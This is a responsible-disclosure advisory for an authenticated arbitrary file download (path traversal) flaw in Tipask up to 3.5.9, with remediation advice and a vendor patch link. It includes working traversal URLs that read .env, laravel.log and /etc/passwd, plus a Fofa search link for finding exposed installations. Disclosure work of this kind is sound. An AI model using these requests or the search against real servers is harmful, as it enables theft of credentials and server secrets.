---
title: "[Responsible Disclosure] Tipask Contains an Authenticated Arbitrary Local File Download Vulnerability"
slug: bunw7e
translationKey: bunw7e
date: 2021-09-16T15:34:53+08:00
source: yuque/penetration
---

```php
http://tipask/attach/download/attachments-2021-09-4oFjTAjm6142e9d617e23.pdf

                                        attachments-2021-09-4oFjTAjm6142e9d617e23.pdf

E:\Desktop\CodeAudit\v3.5.5\storage\app\ attachments\2021\09



E:\Desktop\CodeAudit\v3.5.5\storage\logs\laravel.log


# 
E:\Desktop\CodeAudit\v3.5.5\storage\app\..-logs-laravel.log

E:\Desktop\CodeAudit\v3.5.5\.env
 
  E:\Desktop\CodeAudit\v3.5.5\storage\app\..-..-.env
```



The latest version of Tipask contains an "arbitrary local file download" vulnerability. An attacker can craft special input to download arbitrary files on the Tipask server, such as `.env`, `/etc/passwd`, `laravel.log`, etc., leaking important sensitive information from the server. The impact is significant, and roughly 700+ customers on the public internet may be affected.



# Introduction:
(1) In the latest version of `Tipask<=3.5.9`, the attachment download feature fails to restrict the path parameter supplied by the user

(2) Exploiting the vulnerability requires an authenticated user identity; an attacker who successfully exploits it can download arbitrary files on the Tipask server, such as `.env`, `/etc/passwd`, `laravel.log`, etc.



# **Affected Scope:**
Tipask <=3.5.9 is entirely affected, i.e., all versions of Tipask

Fofa dork: [https://fofa.so/result?qbase64=YXBwPSJUaXBhc2st5YWs5Y%2B45Lqn5ZOBIg%3D%3D](https://fofa.so/result?qbase64=YXBwPSJUaXBhc2st5YWs5Y%2B45Lqn5ZOBIg%3D%3D)



There are 700+ Tipask deployments

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631778554726-34b52dc3-0abb-4991-a59c-408c7a40e739.png)

[  
  
  
](https://learnblockchain.cn/)

# Reproduction Steps:
After registering and logging in, simply visit the following URLs:

```php
https://tipask/attach/download/..-..-.env
http://tipask/attach/download/..-logs-laravel.log
http://tipask/attach/download/..-..-..-..-..-..-..-etc-passwd
```



# Remediation
The vulnerability involves two files:

(1) `app\Http\Controllers\AttachController.php`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631778109392-4b3e80b4-081a-4933-9e02-1b76e24e7085.png)



(2) The `<font style="color:rgb(23, 43, 77);">image/show</font>`<font style="color:rgb(23, 43, 77);"> endpoint is also affected by this issue and should be fixed as well: </font>`app\Http\Controllers\ImageController.php`



1. <font style="color:rgb(23, 43, 77);">Restrict the directory being read, e.g., use </font>`<font style="color:rgb(23, 43, 77);">basename()</font>`<font style="color:rgb(23, 43, 77);"> to process user-supplied input parameters</font>
2. <font style="color:rgb(23, 43, 77);">Forbid user input parameters from containing </font>`<font style="color:rgb(23, 43, 77);">..</font>`<font style="color:rgb(23, 43, 77);"> </font>

<font style="color:rgb(23, 43, 77);"></font>

<font style="color:rgb(23, 43, 77);"></font>

<font style="color:rgb(23, 43, 77);"></font>


The vendor has already released an upgrade patch to fix this security issue; the patch is available at: [https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69](https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69)
